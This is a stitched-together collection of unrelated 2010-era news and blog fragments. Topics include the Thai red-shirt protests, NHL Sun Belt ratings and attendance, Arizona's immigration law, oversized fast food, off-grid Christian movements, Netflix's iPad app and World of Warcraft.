RED -SHIRT PROTEST 14 Mar : Red -shirts converge on Bangkok , hold first big rally , occupy government district 16 Mar : Protesters splash their own blood at Government House 30 Mar : A round of talks with the government ends in deadlock 3 Apr : Red-shirts occupy Bangkok shopping district 7 Apr : PM Abhisit orders state of emergency 10 Apr : Troops try to clear protesters ; 25 people are killed and hundreds injured 22 Apr : Grenade blasts kill one and injure 85 near protest hub ; each side blames the other 28 Apr : Policeman shot in clashes in northern Bangkok
Profile : Thailand 's reds and yellows
Thai protests : Eyewitness accounts Profile : ' Commander Red ' Seh Daeng is in a Bangkok intensive care unit with a low chance of survival , a hospital official told AFP news agency .
He is part of the protesters ' more radical wing and had accused red - shirt leaders - many of whom have distanced themselves from him - of not being hard - line enough .
A New York Times journalist , Thomas Fuller , was interviewing the general at the moment the shot rang out near the Silom business area .
The reporter told the BBC's World Today : " He immediately dropped to the ground , his eyes were open but he was expressionless and his body was n't moving at all . "
A spokesman for the red - shirt movement blamed an army sniper but military officials said troops had orders to fire only in self - defence .
The protesters - who have been occupying parts of Bangkok for more than two months - want Prime Minister Abhisit Vejjajiva to dissolve parliament and call fresh elections .
He had offered polls in November - but the two sides failed to agree a deal because of divisions over who should be held accountable for a deadly crackdown on protests last month .
Mr Thaksin has called on the government to withdraw troops and restart negotiations .
In a statement on Friday he said the government 's actions constituted " grave infringement of human rights and criminal offences " .
Thailand 's worst political unrest in nearly two decades has left at least 30 people dead and more than 1,400 wounded .

YAAAY Last season of Lost is almost over !
I can't wait to watch it !
Yes I save it for all at once .
Any sane person would .
Wait a week between cliffhangers ?
Yeah freaking right .
" Imagine what good we could do with all the money spent on war , religion , and the things that we do not need . "
Machete is n't due in theaters until Labor Day weekend , September 3 , but since today is Cinco de Mayo , Robert Rodriguez and star Danny Trejo have prepared a special new trailer for the film .
Ai n't It Cool News has debuted this brand new trailer , which features a timely introduction by Trejo .
Click below to watch this brand new trailer for the upcoming film , but only if you 're over the age of 18 .
Yesterday , Derek Zona of Copper and Blue posted numbers for 22 of the 24 U.S. based NHL franchises over at From the Rink .
( Which you should be reading regularly , if you are not . )
The numbers paint an interesting picture , with attendance down in 17 of 24 U.S. markets but TV ratings making strong gains .
Dallas was no different .
Numbers are courtesy From the Rink .
We 'll keep this to " Sun Belt Teams " for the sake of brevity and ( laziness ) not having to make huge tables .
Last time I did this , some wanted to see San Jose included in this group , so here they are :
Television :
Team 08-09 Rating 09 - 10 Rating Increase San Jose 1.25 1.11 - 11.20 % Dallas 0.52 0.74 +42.31 % Phoenix 0.5 0.62 +24.00 % Tampa Bay 0.49 0.6 +22.45 % Los Angeles 0.38 0.48 +26.32 % Anaheim 0.29 0.42 +44.83 % Atlanta 0.23 0.33 +43.48 % Florida 0.15 0.25 +66.67 %
The Dallas / Forth Worth 0.74 share represents 18,426 households , up from 12,948 households the year before .
Why ?
Certainly not on - ice performance .
It was n't because of talented free agents acquired .
They were n't more exciting to watch ( 237 goals this year , 230 goals last year ) .
So , why ?
Either way , you have to feel good for Ralph and Razor .
What about attendance ?
Attendance :
Team 08-09 Avg Attendance % Full 09 - 10 Avg Attendance % Full Change % San Jose 17488 99.95 17558 100 0 % Los Angeles 16489 91 17313 96 +5 % Dallas 17681 95 17215 93 - 2.6 % Tampa Bay 16498 83 15497 78 - 6.1 % Anaheim 16991 98 15168 88 - 10.7 % Florida 15622 81 15146 79 - 3 % Atlanta 14626 78 13607 73 - 7 % Phoenix 14876 83 11989 67 - 19.4 %
So the Stars tick down another couple of percentage points and miss the playoffs for the second consecutive season .
Strong home play in the middle of their schedule likely saved the attendance numbers a little bit , but no playoff run to get excited about will hurt them again come next season .
Dallas will always post at least mediocre figures owing to the large pockets of North Eastern transplants .
Chicago , Detroit , Buffalo , Philadelphia , etc , all bring sizable crowds when their team visits .
Many Stars season ticket holders are actually fans of other teams first ( I know some New Jersey fans like this ) that wear their Stars gear 40 games a year , but will switch to the jersey from whence they came when that team comes to town .
Los Angeles shows that strong play on - ice can push your numbers up , while Phoenix shows that it might not necessarily matter .
The Coyotes have been lavished with attention since the playoffs began , but their excellent play started at the beginning of the season and it did n't help their attendance in the least bit .
Other notables from the data are the New Jersey Devils , who play to only 88 % capacity ?? , and the Colorado Avalanche , who had a great season but saw their building only 77 % full .
That 's 13,947 .
A shockingly low number for what has become a strong hockey tradition in Denver .
Senators John McCain ( R - AZ ) and Jon Kyl ( R - AZ ) have defended their state ’s controversial new immigration crackdown on grounds of spiraling crime in Arizona due to the lack of security along the US - Mexico border .
But new studies finds that spillover violence from Mexico has been “ declining , ” bringing into question the timing and validity of this rationale .
ADVERTISEMENT
Raw Story reported Tuesday on a new analysis by ABC News which finds that violence and crime on the US - Mexico border — while amplified in perception due to a few recent widely - documented incidents — has been “ on the decline ” in recent years .
In Arizona , property and violent crimes rates have fallen from 512 per 100,000 people in 2005 to 447 per 100,000 people in 2008 ( beyond which no data is presently available ) , according to statistics from the US Bureau of Justice Statistics compiled by the research group Immigration Policy Center .
You might get a different impression listening to McCain , who chalked up the law enacted last month to “ unending and constant flow of drug smugglers and human traffickers ” — or Kyl , who claimed it was a response to a “ thriving environment for human trafficking . ”
“ Kyl and McCain are hyping the story about the crime and mayhem because it panders to the right and it throws sand in the face of skeptics and critics , ” said Frank Sharry , executive director of the pro-immigration reform group America ’s Voice , in a statement to Raw Story .
“ They use the hype to justify their embrace of a state law that mandates ethnic discrimination .
They use the hype to blame [ Homeland Security Secretary Janet ] Napolitano and [ President Barack ]
Obama for ignoring the problem , ” he added .

Critics charge that the law — which Arizona Gov. Jan Brewer alleged was catalyzed by cross - border “ murder , terror and mayhem ” and “ uncontrolled ” violence — will lead to racial profiling against minorities , particularly Hispanics , by mandating police to probe immigration status during lawful encounters if there is “ reasonable suspicion ” the subject is undocumented .
McCain and Kyl voted for the last major immigration overhaul effort in 2007 , which included a pathway to citizenship for unauthorized immigrants — McCain was a lead sponsor of the bill .
Both have , along with the rest of their party , declined to support similar legislation this year .
“ They use it to justify their refusal to work with Democrats and the White House on comprehensive immigration reform — the approach they both championed in the past as the only way to truly secure the border , ” Sharry said .
ADVERTISEMENT
The Arizona measure , which most Americans favor according recent polls by Gallup and CBS / New York Times , has galvanized activists on both sides of the divisive issue .
While President Obama and Democratic leaders have emphasized their support for a comprehensive overhaul , all indications are that it will not pass during the remainder of this Congress .
In the late afternoon of April 12 , 32 - year - old Nguyen Tran of North Hollywood stepped into the KFC at the corner of Witmer and West 6th streets near downtown Los Angeles .
After a few minutes of scrutinizing the menu board , and glancing at the store ’s signage , he leaned across the counter and asked the man behind the counter , in an almost conspiratorial voice : “ Do you guys have that … you know … the Double Down ? ”
When the cashier tentatively bobbed his head in affirmation , Tran pumped his fist in the air , uttered an excited “ Sweet ! ” and placed his first order for the chain ’s newest creation : a bizarre sandwich made by bookending slices of melted Monterey jack and pepper jack cheese , two slices of bacon and a mysterious “ Colonel ’s sauce ” with two pieces of fried chicken .
And then , while still at the counter , Tran , who is co-owner of downtown L.A. restaurant Starry Kitchen ( with his wife , who is the chef ) , posted about it to Twitter , making him one of the legion of thrill - eaters who share their gustatory feats of derring - do on social media sites .
Upon news of such outlandish eats , most folks scratch their heads and ask “ Why ? ”
But there are some who rub their stomachs and say “ Whoa ! ” and head for the nearest drive - through .
And there ’s apparently a lot more of the latter than you might imagine .
Last week KFC reported it will sell its 10 millionth Double Down before the month is out .

Who are these people ?
And why , when armed with almost daily reports on the dangers of obesity and sodium , does a certain segment of the population appear to be bent on committing hara - kiri by hamburger ?
Poke around the Internet to look at the assortment of hard - core food porn and you start to get an idea .
There are photos of an In - N - Out Burger 100 by 100 ( supposedly a bachelor party order , the finished product looks like a skinned python ) and a YouTube video of a guy who tries to ingest an Octo Stacker ( that ’s an off - menu meat mountain made by cobbling together two Burger King BK Quad Stackers — for a total of eight hamburger patties , eight slices of cheese topped with bacon and representing 1,860 calories , 130 grams of fat and 3,480 milligrams of sodium ) .
Set to the music from the “ Chariots of Fire ” soundtrack , he finally conquers it , but only after enlisting the aid of a spoon .
A hybrid customer - created sandwich , whose McName ca n’t be printed in a family newspaper , made by stuffing a McChicken sandwich inside a McDonald ’s double cheeseburger , has earned an entry in an online urban dictionary and its own Facebook page .

The legitimate on - menu items are only slightly less heart - stopping , such as IHOP ’s new Pancake Stackers , which intersperses buttermilk pancakes with layers of crustless cheesecake — and smothers it all in fruit compote and whipped topping .
The Pancake Stackers combo meal with eggs , bacon and hash browns amounts to 1,250 calories .
Denny ’s now offers a portable version of its Grand Slam breakfast ( presumably to make it more convenient to consume en route to your angioplasty ) called the Grand Slamwich , which crams scrambled eggs , sausage , bacon , shaved ham , mayonnaise and American cheese between two slices of potato bread ( themselves grilled with a maple spice spread ! ) — a double - fistful that clocks in at 1,320 calories .
And if that fails to quell your appetite , may we suggest Denny ’s “ Hooburrito . ”
A burrito named in honor of the band Hoobastank , it wraps spicy chicken strips , onion crispers , pepper jack cheese , cheese sauce and barbecue sauce in a tortilla , weighs in at more than a pound and represents 1,430 calories and 67 fat grams .
Jaw - dropping ( make that jaw - dislocating ) portions have probably been around since
Thag stumbled across his first whole forest - fire roasted wildebeest , and who among us has n’t wondered — at least for a moment — what it would be like to gorge on turducken ( a chicken stuffed inside a duck stuffed inside a turkey ) or inhale an entire Fool ’s Gold Loaf sandwich ( an Elvis Presley favorite consisting of a pound of fried bacon , a jar each of peanut butter and jelly all crammed into a hollowed out loaf of bread ) or dine on the local delicacy known as an Oki dog — two foot - long hot dogs and a handful of deep - fried pastrami smothered in chili and cheese bundled in a tortilla the size of a hubcap ?
In an environment in which the First Lady has enlisted in the battle of the bulge by pledging to help end childhood obesity , and the USDA food pyramid is only an iPhone app away , it might seem appropriate that both the supply and demand of such elephantine eats would decrease .

Harry Balzer , fast - food analyst for the NPD Group , says his research indicates just the opposite .
“ In a 2001 survey , 65 % of people said they ordered a burger that they defined as large — as compared to regular .
As of February 2010 , that percentage was 68 % . ”
Balzer , who has tracked American eating habits for the last three decades , thinks there ’s more at work than hedonistic hankering .
“ Yes , there are a lot of larger burger options , ” he said .
“ But there are also some smaller options too — like McDonald ’s Mac Snack Wrap or burger sliders .
I think the key thing is novelty .
People are always going to want something new — or in the case of fast food , new versions of the things they are familiar with . ”
Key to stoking the demand for Flintstone - sized fast foods is a notion of value , Balzer says .
“ People equate value with larger portions , and this is a way they perceive of getting more for their money . ”
Emanuel Maidenberg concurs .
The associate clinical professor of psychiatry and clinical coordinator for UCLA ’s Anxiety Disorders Program cites the desire for a bigger bang from the burger buck as a motivating factor , but it ’s not the only one .
Advertisement
“ It ’s become a pop culture phenomenon , ” Maidenberg said .
“ Kids learn to associate large amounts of food with something that ’s manly , consistent with the image of being cool , and somewhat rebellious .
And fast - food marketers try to promote that rebellious angle . ”
In his 2006 book “ Mindless Eating , ” food psychologist Brian Wansink detailed how men subconsciously equate appetite to masculinity by offering male subjects descriptions of two hypothetical movie dates : one in which the guy on the date eats a couple of handfuls of his movie popcorn , and another in which he eats almost the entire bucket .
In a follow - up survey , participants estimated the fellow in the second hypothetical “ could bench - press an average of 21 more pounds , ” Wansink wrote .
“ It reminds me of that old joke , ” Wansink said in an interview recently .
“ Why did the Egyptians build the pyramids ?
To impress their girlfriends .
That summarizes for me why most guys do stupid things : to impress , if not their girlfriends , somebody — maybe even themselves — and to inject some adventurousness into their otherwise boring and insipid lives . ”
So if that explains the demand side of offensively over - the - top offerings , how do we reconcile the supply side ?
How do these caloric crimes against humanity make it to the menu in the first place ?
Wansink gives two explanations .
Advertisement
“ When you offer an extreme alternative , it makes the less egregious — but still halfway extreme alternative — seem reasonable , ” he explained .
“ When Burger King came out with its [ Triple Whopper ] , people freaked out about it .
I do n’t know if they ever intended to sell any of those , but it certainly made the [ Double Whopper ] seem reasonable by comparison . ”
The second reason taps directly into the social media hype .
“ Even if nobody buys even one [ KFC ] Double Down — ever — it still brings new life to a fairly mature fried chicken market .
Especially when the news is something that ’s stunning .
You find yourself talking about it , you ’re paying attention to the commercials , and you might even be motivated to go to KFC — even if you ’re not going to eat a Double Down — because you ’re thinking about it again . ”
So , six weeks after launch , has Tran doubled - down and consumed a second KFC Double Down ?
“ No , ” Tran said , before quickly correcting himself .
Advertisement
“ Wait — that ’s not true .
But that ’s only because that day I bought two Double Downs , ate one and gave the other one to my wife .
She took a bite and did n’t want it , gave it to her sous chef , he took a bite and did n’t want it , so I ate the rest . ”
“ I ’m one of those guys who hates to see things go to waste — even if they ’re bad . ”
Tran ’s taste buds aside , KFC ’s clearly doubling down on the bet that its freakish foodstuff will give some wings to its bottom line .
Last week it announced that the limited - time offering — which was set to disappear May 23 — will remain on the menu for an extended period of time .
Which is probably good news for thrill - seeking food faddists , and very bad news for chickens .

Watch Christians Unplugged on CNN International " World 's Untold Stories " May 29 at 1630 GMT , May 30 at 1100 GMT , 1830 GMT and May 31 at 0200 GMT
Summer Lake , Oregon ( CNN ) --
As the sun rises , cool blues and grays begin their slow transition to glowing golds and ambers .
Like a child 's pop-up book , dimension is added and a valley is transformed .
To look upon this beauty in the western U.S. state of Oregon is to understand what people mean when they say this is God 's country , and that 's exactly why Brother Gregory lives here .
He is part of a wider movement of conservative Christians who are choosing to live their lives on the edge of society , unplugged from civilization as much as they can , living under basic biblical principles .
Brother Gregory -- the " Brother " is more of a nickname than an occupational title -- ministers from the Oregon desert where he lives with his wife , some of his grown children and grandchildren .
Like other conservative Christians in this growing movement , Brother Gregory believes that Christianity has strayed too far from its roots , and has given its role in people 's lives over to the government -- as with welfare programs or health care .
" We are not living off the grid as much as we are creating a new grid , a more wholesome grid , " he said .
" We are following a different path that we think is healthier , promotes better families , and better communities . "
He does n't believe a church needs four walls and a roof .
Rather , a church is people who believe in taking care of each other -- living under the biblical principles of faith , hope and charity .
" Christians should be looking for a way to take care of one another without forcing their neighbor to contribute to their welfare .
In essence that 's coveting your neighbor 's goods through the agency of the governments you create . "
And that is a sin .
Brother Gregory runs the web site for " His Holy Church , " and he explains that he is not what you would typically think of as a minister .
He does n't regularly get up and speak before a congregation , for example .
" ' His Holy Church ' is a phrase .
It 's ' His ' , meaning Jesus Christ .
Jesus Christ established the Church 2,000 years ago .
It 's ' Holy ' because it 's separate .
It 's separate from the world .
It 's in the world but not of the world .
And it 's a ' Church ' , which actually comes from the Greek ' ekklesia ' , meaning ' called out ' .
They 're called out to do the will of Jesus Christ and the Father in Heaven . "
Brother Gregory , a shepherd in the literal sense at his ranch in Summer Lake , Oregon , sees echoes of that in his religious life as a minister .
" Sheep teach the shepherd to be a good shepherd , " he says , " and in that sense , that 's what people need .
They need a good shepherd who 's not going to rule over them but guide them in the good ways , the ways of life . "
There are others with similar views to Brother Gregory .
But while Brother Gregory is content spreading his gospel over the internet and simply living out his life on his ranch in Oregon , these Christians take things a step further .
There is a group called Christian Exodus , and while they too believe modern Christianity is corrupt , they are a little more fired up about the role government plays .
Mainly , that it should n't have any role at all .
Keith Humphrey is the executive director of Christian Exodus .
His long Amish - style beard gives a very visible clue to his beliefs .
He would love to live in simpler times , when government was virtually non-existent .
" Making the government an idol is the problem .
That 's what stands in the way of Christian sanctification , " Humphrey says .
" It 's hands off mainly things like our family , our children , our bodies , our health , and even our money , the fruits of our labor .
These do n't belong to government . "
Christian Exodus considers itself a movement .
In 2004 , it tried to get its members -- some 1,500 or so who have signed up online -- to move together to South Carolina , form a community and secede from the United States .
" We originally anticipated thousands and thousands of people overwhelming these smaller counties , " Humphrey says .
" We had people moving , that were moving , but they were kind of putting the cart before the horse , because they were n't living independently .
They were just showing up and saying ' Okay , where 's my house and where 's my job ? '
We 're like , ' Uh , no , it does n't work like that . '"
When the idea did n't work out , Christian Exodus then started trying to pull members together into micro-communities , through social networking , and encouraging its members to live through what it calls ' personal secession ' .
" Personal secession are things like homeschooling , house churches , home gardening , home - based economics , just regaining privacy and a sense of community rather than worrying about what 's going on in Washington , D.C...
What 's the latest thing from the Supreme Court ?
" You know , who cares ?
I do n't care about what they 're saying in D.C. because they do n't represent me hardly more than Pyongyang . "
His Holy Church and Christian Exodus each say it is hard to track how many followers they may have , because many people who believe in their movements also do n't like to be tracked .
They live " off the grid " in every aspect .
But each group has thousands of members signed up online , and each says many more could be unregistered followers .
They exist on the edge of society , living as they believe Christians did in the beginning .
If you ’ve used the Netflix iPad app , you ’ve probably thought how cool it would be if you could connect your iPad to a TV to watch what ’s streaming to the app .
Someone at Netflix must have read your mind , because the company on Wednesday updated its iPad app to support video output via Apple ’s optional VGA , component , or composite dock connector cables .
Netflix for iPad version 1.0.2 frees you from your iPad ’s 9.7 - inch display , letting you view movies from your iPad on much larger displays at resolutions up to 1024 by 768 .
( It also includes some crash fixes . )
The Netflix app is a free download , but requires a Netflix subscription for access to the service ’s Watch Instantly content .
Of course you ’ll also need to buy an adapter — which costs either $ 29 or $ 49 — to view movies from your iPad on larger screens , but with this newfound ability , the iPad will likely become a traveling film buff ’s best friend .
Since the game ’s introduction in November 2004 the company has expanded to more than 1,800 employees from around 400 .
Almost all of the additions have been customer - service representatives to handle World of Warcraft players , helping them with both technical advice and billing concerns .
“ Ultimately , what I ’d like is for the user to feel like they are having a very polished entertainment experience , ” said Mike Morhaime , 38 , Blizzard ’s president ( and a gamer since he first encountered Pong in 1976 ) .
“ We ’d like players to associate our name with quality , so if they see a box on the shelf and it says Blizzard Entertainment , they do n’t need to know anything more than that . ”
The basic genre that World of Warcraft belongs to is called the massively - multiplayer online game , or M.M.O.
The “ massive ” refers to the fact that in an M.M.O. , thousands of players simultaneously occupy one vast virtual 3 - D world .
( In a more traditional online game like Quake or Counter - Strike , there are generally fewer than a dozen people in each arena . )
Blizzard runs hundreds of copies of the Worlds of Warcraft universe , known as servers , and there might be a few thousand players on any server at any given time .
There are servers customized for six written languages : English , both simplified and traditional Chinese , Korean , German and French .
Spanish is in development .
To begin , a player creates an avatar , or character , customizing its physical appearance as well as race and profession , each of which has different skills and abilities .
An elf druid might specialize in healing , for example , while an orc rogue could be an expert in stealth and backstabbing .
The player is then set loose in a huge colorful fantasy world with cities , plains , oceans , mountains , forests , rivers , jungles , deserts and of course dungeons .
The players can explore on their own or team up with others to conquer more imposing challenges .
As a character completes quests and defeats monsters , it gains new abilities and collects more powerful magical equipment that in turn allow it to progress to the next set of challenges .
Players can fight other players if they choose , but much of the focus is on teaming up with other users in guilds like the Chosen to battle automated foes .
There were massively - multiplayer games before World of Warcraft , just as there were MP3 players before Apple ’s iPod .
Like the iPod , World of Warcraft has essentially taken over and redefined an entire product category .
